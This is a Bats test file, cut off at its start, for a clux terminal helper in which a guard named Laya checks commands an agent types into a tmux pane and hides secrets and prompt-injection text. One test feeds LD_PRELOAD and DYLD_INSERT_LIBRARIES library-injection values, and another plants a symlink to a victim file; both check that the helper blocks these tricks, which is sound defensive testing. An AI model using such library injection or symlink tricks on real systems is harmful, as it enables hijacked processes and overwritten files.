        capture_to_cursor() { n=\$((n + 1)); CAPTURE=\"top \$n\"\$'\\na\\nb\\nc\\nd\\nclux\$ '; }
        laya_call() { echo x >> '$count'; echo '{\"state\": \"other\"}'; }
        pane_state; pane_state; pane_state; echo \$PANE_STATE"
    [ "$output" = other ]
    [ "$(wc -l < "$count" | tr -d ' ')" -eq 1 ]
}

@test "a second reader of the same run exits 5 and leaves the output" {
    local d="$BATS_TEST_TMPDIR/two"
    mkdir -p "$d"
    printf '0\n' > "$d/3.rc"; printf 'out\n' > "$d/3.out"; : > "$d/3.done"
    sleep 30 3>&- & local live=$!
    ln -s "$live" "$d/3.reading"
    run --separate-stderr bash -c "source '$TERMINAL'; D='$d'; S_SEQ=3; report_run 3 200"
    [ "$status" -eq 5 ]
    [ "$stderr" = 'another verb reads the output of run 3 now: try again' ]
    [ -e "$d/3.out" ] && [ ! -e "$d/3.held" ]
    [ "$(readlink "$d/3.reading")" = "$live" ]
    kill "$live"; wait "$live" 2>/dev/null || true
}

@test "each failure path of open goes through open_abort" {
    ! grep -q 'rm -rf "$D"; fail' "$TERMINAL" || false
    [ "$(grep -c "open_abort [01] 'cannot open\|open_abort 1 'the companion shell did not reach its prompt' 1" "$TERMINAL")" -eq 3 ]
}

@test "laya install makes a broken venv again, and names a CLUX_LAYA_PYTHON with no laya" {
    require_laya_python
    local venv="$BATS_TEST_TMPDIR/data/clux/laya" name
    make_fake_venv "$venv"
    make_fake_checkpoint "$BATS_TEST_TMPDIR/hf"
    # A Python upgrade broke the venv python; the marker stays.
    printf '#!/usr/bin/env bash\nexit 1\n' > "$venv/bin/python3"
    for name in python3.12 python3.13 python3.11 python3.10 python3; do
        printf '#!/usr/bin/env bash\nexit 1\n' > "$BATS_TEST_TMPDIR/stubs/$name"
        chmod +x "$BATS_TEST_TMPDIR/stubs/$name"
    done
    run env -u TMUX -u TMUX_PANE XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" \
        HF_HUB_CACHE="$BATS_TEST_TMPDIR/hf" "$TERMINAL" laya install
    [ "$status" -eq 2 ] || { echo "$output"; false; }
    [[ "$output" == *'laya install needs python3 3.10 or later'* ]] || false
    [ ! -f "$venv/.clux-installed" ]
    run env -u TMUX -u TMUX_PANE CLUX_LAYA_PYTHON=/usr/bin/false XDG_DATA_HOME="$BATS_TEST_TMPDIR/data" \
        "$TERMINAL" laya install
    [ "$status" -eq 2 ]
    [[ "$output" == *'CLUX_LAYA_PYTHON cannot import laya'* ]] || false
}

@test "exit in a run ends the command, and the directory still comes back" {
    local d="$BATS_TEST_TMPDIR/ex"
    mkdir -p "$d"
    bash -c "source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; write_rc_file"
    printf '%s' 'cd /tmp; false || exit 3; echo AFTER' > "$d/1.cmd"
    run bash -c "source '$d/rc.bash'; __clux_run 1 \$(__clux_sum \"\$(cat '$d/1.cmd')\") plain
        echo \"pwd=\$PWD\""
    [[ "$output" != *$'\nAFTER'* ]] || { echo "$output"; false; }
    [[ "$output" == *'pwd=/tmp'* ]] || { echo "$output"; false; }
    [ "$(cat "$d/1.rc")" = 3 ]
}

@test "a run that changes IFS keeps the exported variables of the pane shell" {
    local d="$BATS_TEST_TMPDIR/ifs"
    mkdir -p "$d"
    bash -c "source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; write_rc_file"
    printf '%s' 'IFS=:; for p in $PATH; do :; done; export NEW=1' > "$d/1.cmd"
    run bash -c "source '$d/rc.bash'; export KEEP=k; __clux_run 1 \$(__clux_sum \"\$(cat '$d/1.cmd')\") plain >/dev/null 2>&1
        echo \"\${KEEP-}|\${NEW-}|\${PATH:+path}|\${HOME:+home}\""
    [ "$output" = 'k|1|path|home' ]
}

@test "IGNOREEOF and TMOUT are read-only in the pane shell" {
    local d="$BATS_TEST_TMPDIR/ro"
    mkdir -p "$d"
    bash -c "source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; write_rc_file"
    # An assignment to a read-only name stops a shell that is not
    # interactive, so each one runs in its own shell.
    run bash -c "source '$d/rc.bash'; declare -p IGNOREEOF TMOUT"
    [ "$output" = $'declare -r IGNOREEOF="1000000"\ndeclare -r TMOUT="0"' ]
    run bash -c "source '$d/rc.bash'; IGNOREEOF=0; echo changed"
    [[ "$output" == *'IGNOREEOF: readonly variable'* ]] && [[ "$output" != *changed* ]] || false
    run bash -c "source '$d/rc.bash'; TMOUT=1; echo changed"
    [[ "$output" == *'TMOUT: readonly variable'* ]] && [[ "$output" != *changed* ]] || false
}

@test "send and run read the state again after the typing lock" {
    local d="$BATS_TEST_TMPDIR/seq"
    mkdir -p "$d"
    printf 'mode=split\npane=%%1\nsocket=\nseq=5\ntoken=ab12cd34\n' > "$d/state"
    printf '0\n' > "$d/5.rc"
    # Another run starts (seq 6, a question) after this verb read the state
    # and before it has the typing lock.
    local later="printf 'mode=split\\npane=%%1\\nsocket=\\nseq=6\\ntoken=ab12cd34\\n' > '$d/state'; : > '$d/6.confirm'; mkdir -p '$d/busy'"
    run --separate-stderr bash -c "source '$TERMINAL'; D='$d'
        ensure_open() { state_load; }
        take_typing_lock() { $later; TYPING_LOCK=1; }
        send_command --enter -- y"
    [ "$status" -eq 3 ]
    [ "$stderr" = 'laya confirmation in the companion pane: the user must answer it there' ]
    rm -rf "$d/6.confirm" "$d/busy"
    printf 'mode=split\npane=%%1\nsocket=\nseq=5\ntoken=ab12cd34\n' > "$d/state"
    run --separate-stderr bash -c "source '$TERMINAL'; D='$d'
        ensure_open() { state_load; }
        take_typing_lock() { $later; rm -f '$d/6.confirm'; TYPING_LOCK=1; }
        wait_for_prompt() { echo TAKEOVER; return 1; }
        run_command -- 'ls'"
    [ "$status" -eq 5 ]
    [ "$stderr" = 'the companion is busy' ]
    [[ "$output" != *TAKEOVER* ]] || false
}

@test "one function checks that a Python can import laya" {
    [ "$(grep -c 'import laya.structured' "$TERMINAL")" -eq 1 ]
    ! grep -qE 'laya_(venv|client)_ready' "$TERMINAL" || false
}

@test "new_screen_lines gives the new lines, each with the line above it" {
    run bash -c "source '$TERMINAL'; new_screen_lines \$'a\\nb\\nc' \$'a\\nb\\nd'"
    [ "$output" = $'b\nd' ]
    run bash -c "source '$TERMINAL'; new_screen_lines \$'a\\nb' \$'b\\na'"
    [ -z "$output" ]
}

@test "wait --pattern sends only the new lines of a changed screen to the guard" {
    local log="$BATS_TEST_TMPDIR/guard.log" top
    top=$(seq 1 20 | sed 's/^/row /')
    run bash -c "source '$TERMINAL'; D='$BATS_TEST_TMPDIR'
        ensure_open() { :; }; last_run_secret() { return 1; }; laya_confirm_pending() { return 1; }
        probe_pane() { return 0; }; sleep() { :; }
        tmux_state() { echo x >> '$BATS_TEST_TMPDIR/n'; n=\$(wc -l < '$BATS_TEST_TMPDIR/n'); n=\$((n)); printf '%s\\nprogress %s\\n' '$top' \"\$n\"; [ \"\$n\" -lt 3 ] || echo DONE; }
        laya_guard() { GUARD_TEXT=\$(cat \"\$1\"); printf '%s\\n' \"\$GUARD_TEXT\" | wc -l | tr -d ' ' >> '$log'; }
        wait_command --pattern DONE --timeout 5"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ "$(tr '\n' ' ' < "$log")" = '21 2 3 ' ]
}

@test "the shell rules of send apply only in a nested shell, not at the clux prompt or in python3" {
    local log="$BATS_TEST_TMPDIR/flags"
    run bash -c "source '$TERMINAL'; S_TOKEN=ab12cd34; PROMPT_MARK='clux-ab12cd34\$'; SCREEN_ABOVE=x
        laya_gate() { echo \"\$*\" >> '$log'; cat >/dev/null; GATE_LEVEL=safe; }
        PANE_STATE=shell_prompt; CURSOR_LINE='>>> '
        tmux_state() { echo python3.12; }; send_gate 'print(1)'
        tmux_state() { echo -bash; }; CURSOR_LINE='user@host\$ '; send_gate 'ls'
        tmux_state() { return 1; }; send_gate 'ls'
        PANE_STATE=other; tmux_state() { echo bash; }; CURSOR_LINE='Delete? [y/N] '; send_gate 'y'
        PANE_STATE=shell_prompt; CURSOR_LINE='clux-ab12cd34\$ '; send_gate 'ls'
        CURSOR_LINE='user@remote\$ '; tmux_state() { echo ssh; }; send_gate 'ls'
        tmux_state() { echo kubectl; }; send_gate 'ls'
        CURSOR_LINE='> '; tmux_state() { echo node; }; send_gate '1'"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ "$(cat "$log")" = $'--screen\n--screen --shell\n--screen --shell\n--screen\n--screen\n--screen --shell\n--screen --shell\n--screen' ]
}

@test "at the clux prompt a line that ends goes through __clux_line, and only edit keys go raw" {
    local log="$BATS_TEST_TMPDIR/keys" d="$BATS_TEST_TMPDIR/cl" k
    mkdir -p "$d"
    local stubs="source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; PROMPT_MARK='clux-ab12cd34\$'; CONT_MARK='clux-ab12cd34> '
        ensure_open() { :; }; lock_and_load() { :; }; laya_confirm_pending() { return 1; }; hidden_text() { return 1; }
        check_pane() { CURSOR_LINE='clux-ab12cd34\$ echo hi'; PANE_STATE=shell_prompt; }
        capture_cursor_line() { CURSOR_LINE='clux-ab12cd34\$ echo hi'; }
        send_gate() { :; }; line_unchanged() { :; }; cursor_mid_line() { return 1; }
        send_key() { echo \"key \$1\" >> '$log'; }; send_literal() { echo \"text \$1\" >> '$log'; }"
    for k in M-x C-x C-o M-C-e C-r; do
        run --separate-stderr bash -c "$stubs; send_command --key $k"
        [ "$status" -eq 2 ] || { echo "$k: $status $stderr"; false; }
        [[ "$stderr" == 'at the clux prompt, only Enter and keys that edit the line work: '* ]] || false
    done
    run --separate-stderr bash -c "$stubs; send_command --key Escape"
    [ "$status" -eq 2 ]
    [ "$stderr" = 'at the clux prompt, Escape is not permitted: use send --key C-c' ]
    [ ! -e "$log" ]
    run bash -c "$stubs; send_command --key C-a; send_command --key Enter"
    [ "$status" -eq 0 ] || { echo "$output"; false; }
    [ "$(cat "$d/line.cmd")" = 'echo hi' ]
    [ "$(sed -n 1p "$log")" = 'key C-a' ]
    # C-e first: C-u removes only the text to the left of the cursor.
    [ "$(sed -n 2p "$log")" = 'key C-e' ]
    [ "$(sed -n 3p "$log")" = 'key C-u' ]
    [[ "$(sed -n 4p "$log")" == 'text __clux_line '* ]] || false
    [ "$(sed -n 5p "$log")" = 'key Enter' ]
    rm -f "$log"
    run bash -c "$stubs; send_command --enter -- ' | wc -c'"
    [ "$(cat "$d/line.cmd")" = 'echo hi | wc -c' ]
}

@test "__clux_line runs the line in a subshell once, and only with its sum" {
    local d="$BATS_TEST_TMPDIR/li"
    mkdir -p "$d"
    bash -c "source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; write_rc_file"
    printf '%s' "cd /tmp; export LI=1; f() { :; }; exit 4" > "$d/line.cmd"
    run bash -c "source '$d/rc.bash'; __clux_line \$(__clux_sum \"\$(cat '$d/line.cmd')\")
        echo \"rc=\$? \$PWD \${LI-} \$(declare -F f | wc -l | tr -d ' ')\"; __clux_line x"
    [[ "$output" == *$'rc=4 /tmp 1 0\nrefused: no line is waiting' ]] || { echo "$output"; false; }
    printf '%s' 'echo RAN' > "$d/line.cmd"
    run bash -c "source '$d/rc.bash'; __clux_line 0123456789abcdef0123456789abcdef"
    [ "$output" = 'refused: the line changed after Laya examined it' ]
    [ ! -e "$d/line.cmd" ]
}

@test "the __clux functions of rc.bash are read-only, and POSIX mode does not stay" {
    local d="$BATS_TEST_TMPDIR/rof"
    mkdir -p "$d"
    bash -c "source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; write_rc_file"
    run --separate-stderr bash -c "source '$d/rc.bash'; __clux_run() { echo NEW; }; declare -f __clux_run | grep -c NEW"
    [ "$output" = 0 ]
    [ "$stderr" = 'bash: __clux_run: readonly function' ]
    printf '/tmp\0POSIXLY_CORRECT=1\0LD_PRELOAD=/tmp/x.so\0DYLD_INSERT_LIBRARIES=/tmp/y\0=\0' > "$d/k"
    run bash -c "source '$d/rc.bash'; set -o posix; __clux_load '$d/k'; echo \"\${POSIXLY_CORRECT-none}\${LD_PRELOAD-}\${DYLD_INSERT_LIBRARIES-}\"; shopt -qo posix && echo posix-on || echo posix-off"
    [ "$output" = $'none\nposix-off' ]
}

@test "add_seen_lines adds only the lines that the set does not have" {
    run bash -c "source '$TERMINAL'; add_seen_lines \$'a\\nb' \$'b\\nc\\na\\nc'"
    [ "$output" = $'a\nb\nc' ]
}

@test "held_lines finds the lines that the guard held, and visible_lines hides them" {
    run bash -c "source '$TERMINAL'; held_lines \$'Password:\\nhunter2\\na\\nb\\nc\\nd' \$'Password:\\n[held by laya: secret]\\n[held by laya: prompt_injection, 2 lines]\\nc\\nd'"
    [ "$output" = $'hunter2\na\nb' ]
    # When the two do not line up, the rest counts as held.
    run bash -c "source '$TERMINAL'; held_lines \$'a\\nb\\nc' \$'a\\nX'"
    [ "$output" = $'b\nc' ]
    run bash -c "source '$TERMINAL'; visible_lines \$'hunter2\\n[held by laya: secret]\\nok' \$'hunter2'"
    [ "$output" = ok ]
}

@test "wait --pattern keeps a line held that an earlier guard held by the pair rule" {
    run bash -c "source '$TERMINAL'; D='$BATS_TEST_TMPDIR'
        ensure_open() { :; }; last_run_secret() { return 1; }; laya_confirm_pending() { return 1; }
        probe_pane() { return 0; }; sleep() { :; }
        tmux_state() { echo x >> '$BATS_TEST_TMPDIR/n'; printf 'Password:\\nhunter2\\n'; [ \$(wc -l < '$BATS_TEST_TMPDIR/n') -lt 2 ] || echo next; }
        laya_guard() { GUARD_TEXT=\$(awk '{ if (p == \"Password:\" && \$0 == \"hunter2\") print \"[held by laya: secret]\"; else print; p = \$0 }' \"\$1\"); }
        wait_command --pattern hunter --timeout 2"
    [ "$status" -eq 1 ] || { echo "$output"; false; }
    [ "$(wc -l < "$BATS_TEST_TMPDIR/n")" -ge 2 ]
}

@test "open on a live companion with no Laya server of its own, or a dead external server, exits 6" {
    run --separate-stderr bash -c "source '$TERMINAL'; S_LAYA_URL=; S_LAYA_PID=; laya_call() { return 0; }; laya_restart_if_down; echo SUCCESS"
    [ "$status" -eq 6 ]
    [ "$stderr" = 'laya not available: this companion has no Laya server: use close, then open' ]
    run --separate-stderr bash -c "source '$TERMINAL'; S_LAYA_URL=http://127.0.0.1:9; S_LAYA_PID=; laya_call() { return 1; }; laya_restart_if_down; echo SUCCESS"
    [ "$status" -eq 6 ]
    [ "$stderr" = 'laya not available: the server at CLUX_LAYA_URL does not answer' ]
}

@test "run takes the busy lock of a run verb that died before it typed" {
    local d="$BATS_TEST_TMPDIR/bz" dead
    mkdir -p "$d/busy"
    printf 'mode=split\npane=%%1\nsocket=\nseq=0\ntoken=ab12cd34\n' > "$d/state"
    printf 'pending\n' > "$d/busy/owner"
    bash -c 'exit 0' & dead=$!; wait "$dead" || true
    printf '%s\n' "$dead" > "$d/busy/pid"
    local stubs="source '$TERMINAL'; D='$d'
        ensure_open() { state_load; }; lock_and_load() { state_load; }; hidden_text() { return 1; }
        wait_for_prompt() { echo TAKEOVER; return 1; }"
    run --separate-stderr bash -c "$stubs; run_command -- ls"
    [[ "$output" == *TAKEOVER* ]] || { echo "$output $stderr"; false; }
    sleep 30 3>&- & local live=$!
    mkdir -p "$d/busy"; printf 'pending\n' > "$d/busy/owner"; printf '%s\n' "$live" > "$d/busy/pid"
    run --separate-stderr bash -c "$stubs; run_command -- ls"
    kill "$live"; wait "$live" 2>/dev/null || true
    [ "$status" -eq 5 ]
    [ "$stderr" = 'the companion is busy' ]
}

@test "one helper reads key names with no case, and it keeps nocasematch" {
    [ "$(grep -c 'shopt -p nocasematch' "$TERMINAL")" -eq 0 ]
    run bash -c "source '$TERMINAL'
        accept_key enter && edit_key c-A && nav_key pgdn && ! accept_key KPEnter && ! edit_key C-x && echo keys
        shopt -q nocasematch || echo off
        shopt -s nocasematch; accept_key Enter; shopt -q nocasematch && echo on"
    [ "$output" = $'keys\noff\non' ]
}

@test "wait --pattern starts no guard after its time limit" {
    local log="$BATS_TEST_TMPDIR/late.log"
    run bash -c "source '$TERMINAL'; D='$BATS_TEST_TMPDIR'
        ensure_open() { :; }; last_run_secret() { return 1; }; laya_confirm_pending() { return 1; }
        probe_pane() { command sleep 1.2; }; sleep() { :; }
        tmux_state() { echo screen; }
        laya_guard() { echo x >> '$log'; GUARD_TEXT=\$(cat \"\$1\"); }
        wait_command --pattern NEVER --timeout 1"
    [ "$status" -eq 1 ]
    [ ! -e "$log" ]
}

@test "rc.bash sets ignoreeof, so C-d at the prompt does not end the pane shell" {
    local d="$BATS_TEST_TMPDIR/rc"
    mkdir -p "$d"
    bash -c "source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; write_rc_file"
    run bash -c "source '$d/rc.bash'; shopt -qo ignoreeof && echo on; echo \"\$IGNOREEOF\""
    [ "$output" = $'on\n1000000' ]
}

@test "the typing lock refuses a live holder and takes the lock of a dead holder" {
    local d="$BATS_TEST_TMPDIR/lock"
    mkdir -p "$d"
    sleep 30 3>&- & local live=$!
    ln -s "$live" "$d/typing"
    run bash -c "source '$TERMINAL'; D='$d'; take_typing_lock; echo rc=\$?"
    [[ "$output" == *'another send or run is typing in the pane: try again'* ]] || false
    [[ "$output" == *'rc=5' ]] || false
    [ "$(readlink "$d/typing")" = "$live" ]
    kill "$live"; wait "$live" 2>/dev/null || true
    run bash -c "source '$TERMINAL'; D='$d'; take_typing_lock; echo rc=\$?; readlink '$d/typing'; echo \$\$"
    [ "${lines[0]}" = 'rc=0' ]
    [ "${lines[1]}" = "${lines[2]}" ]
    # The EXIT trap releases the lock.
    [ ! -L "$d/typing" ]
}

@test "send refuses when the cursor line changed while Laya examined it" {
    run bash -c "source '$TERMINAL'
        CURSOR_LINE='clux\$ ls'
        capture_cursor_line() { CURSOR_LINE='Password:'; }
        line_unchanged; echo rc=\$?
        CURSOR_LINE='clux\$ ls'
        capture_cursor_line() { CURSOR_LINE='clux\$ ls'; }
        line_unchanged; echo rc=\$?
        capture_cursor_line() { return 1; }
        line_unchanged; echo rc=\$?"
    [ "$output" = $'the line changed while Laya examined it: read, then send again\nrc=5\nrc=0\nthe line changed while Laya examined it: read, then send again\nrc=5' ]
}

@test "send and run refuse with exit 2 when Laya cannot examine all the text" {
    run bash -c "source '$TERMINAL'
        laya_call() { return 3; }; laya_gate </dev/null; echo \$?"
    [ "$output" = '3' ]
    grep -q "3) fail 'laya: the line is too long to examine: make it shorter' 2" "$TERMINAL"
    grep -q "3) release_busy; fail 'laya: the command is too long to examine: make it shorter' 2" "$TERMINAL"
}

@test "rc.bash gets the directory and the prompt token as values, not from the environment" {
    local d="$BATS_TEST_TMPDIR/rc"
    mkdir -p "$d"
    bash -c "source '$TERMINAL'; D='$d'; S_TOKEN=ab12cd34; write_rc_file"
    run bash -c "source '$d/rc.bash'; echo \"\$PS1|\$__clux_dir\"; ( __clux_dir=/tmp ) 2>/dev/null || echo readonly"
    [ "$output" = "clux-ab12cd34\$ |$d"$'\nreadonly' ]
    ! grep -q 'CLUX_TERMINAL_D=' "$TERMINAL" || false
}

@test "the prompt needs the token of the companion" {
    run bash -c "source '$TERMINAL'
        D='$BATS_TEST_TMPDIR'; S_TOKEN=ab12cd34
        write_state split %1 '' 1
        state_load
        for CURSOR_LINE in 'clux\$ ' 'clux\$' 'fooclux\$ ls'; do
            prompt_input && echo \"wrong: \$CURSOR_LINE\"
            line_at_prompt && echo \"wrong at: \$CURSOR_LINE\"
        done
        CURSOR_LINE='fooclux-ab12cd34\$ ls -l'; prompt_input && echo \"[\$PROMPT_INPUT]\"
        CURSOR_LINE='clux-ab12cd34\$ '; line_at_prompt && echo at"
    [ "$output" = $'[ls -l]\nat' ]
}

@test "check_pane refuses when the capture of the pane fails" {
    run --separate-stderr bash -c "source '$TERMINAL'
        pane_state() { return 1; }; current_companion_alive() { return 0; }
        check_pane; echo \$?"
    [ "$output" = 5 ]
    [ "$stderr" = 'cannot read the companion pane: try again' ]
    run --separate-stderr bash -c "source '$TERMINAL'
        pane_state() { return 1; }; current_companion_alive() { return 1; }
        check_pane; echo \$?"
    [ "$status" -eq 4 ]
}

@test "the guard uses a new temporary file and the C locale for tail and tr" {
    local d="$BATS_TEST_TMPDIR/g" victim="$BATS_TEST_TMPDIR/victim"
    mkdir -p "$d"
    printf 'keep\n' > "$victim"
    ln -s "$victim" "$d/guard.tmp"
    printf 'a\377b\000c\n' > "$BATS_TEST_TMPDIR/in"
    run bash -c "export LC_ALL=en_US.UTF-8 LANG=en_US.UTF-8
        source '$TERMINAL'; D='$d'
        laya_call() { printf 'held=0\n'; cat; }
        laya_guard '$BATS_TEST_TMPDIR/in'; echo \"rc=\$?\"
        printf '%s' \"\$GUARD_TEXT\" | od -An -c | tr -s ' '"
    [[ "$output" == 'rc=0'* ]] || false
    [[ "$output" == *'a 377 b c'* ]] || false
    [ "$(cat "$victim")" = keep ]
    [ "$(find "$d" -name 'guard.*' ! -name guard.tmp | wc -l | tr -d ' ')" -eq 0 ]
}

@test "nav_key finds only the move keys of a pager or a menu" {
    run bash -c "source '$TERMINAL'
        for k in Up down Left Right Home End PageUp PgUp PageDown PgDn NPage PPage; do
            nav_key \"\$k\" || echo \"missed \$k\"
        done
        for k in Space Enter q y C-Up M-Down Tab; do
            ! nav_key \"\$k\" || echo \"wrong \$k\"
        done"
    [ -z "$output" ]
}

@test "cursor_mid_line reads an ASCII row with no client" {
    run bash -c "source '$TERMINAL'
        LAYA_PY=/nonexistent
        tmux_state() { case \"\$*\" in *cursor_x*) echo \"\$CX 0\" ;; *) printf '%s\n' 'clux-ab12cd34\$ ls   ' ;; esac; }
        CX=16; cursor_mid_line; echo \$?
        CX=18; cursor_mid_line; echo \$?
        CX=15; cursor_mid_line; echo \$?"
    [ "$output" = $'0\n1\n0' ]
}

@test "the skill and the release notes have no author notes" {
    ! grep -n 'inferred' "$REPO_ROOT/plugins/clux/skills/terminal/SKILL.md" "$REPO_ROOT/CHANGELOG.md" || false
}

@test "the terminal skill covers Laya and the time limits of terminal.sh" {
    local skill="$REPO_ROOT/plugins/clux/skills/terminal/SKILL.md" t g
    read -r t g < <(bash -c "source '$TERMINAL'; echo \"\$RUN_TIMEOUT_DEFAULT \$LAYA_GUARD_LIMIT\"")
    grep -qF 'terminal.sh laya install' "$skill"
    grep -qF '600000' "$skill"
    grep -qF '[held by laya:' "$skill"
    grep -qF 'config/laya/' "$skill"
    grep -qF 'laya confirmation' "$skill"
    grep -qF '| 6 |' "$skill"
    grep -qF "The default time limit is $t seconds" "$skill"
    # 46 s of Laya checks at most, plus a 10 s margin.
    grep -qF "S + 56" "$skill"
    grep -qF "(S + 56) × 1000" "$skill"
}

@test "the 4.0.0 release names Laya and the run time limit" {
    local t section
    t=$(bash -c "source '$TERMINAL'; echo \"\$RUN_TIMEOUT_DEFAULT\"")
    grep -q '"version": "4.0.0"' "$REPO_ROOT/plugins/clux/.claude-plugin/plugin.json"
    [ "$(grep -m1 '^## \[' "$REPO_ROOT/CHANGELOG.md")" = '## [4.0.0]' ]
    section=$(awk '/^## \[4\.0\.0\]/ { on = 1; next } /^## \[/ { on = 0 } on' "$REPO_ROOT/CHANGELOG.md")
    [[ "$section" == *'needs Laya'* ]] || false
    [[ "$section" == *"$t seconds"* ]] || false
    grep -q 'terminal.sh laya install' "$REPO_ROOT/README.md"
}
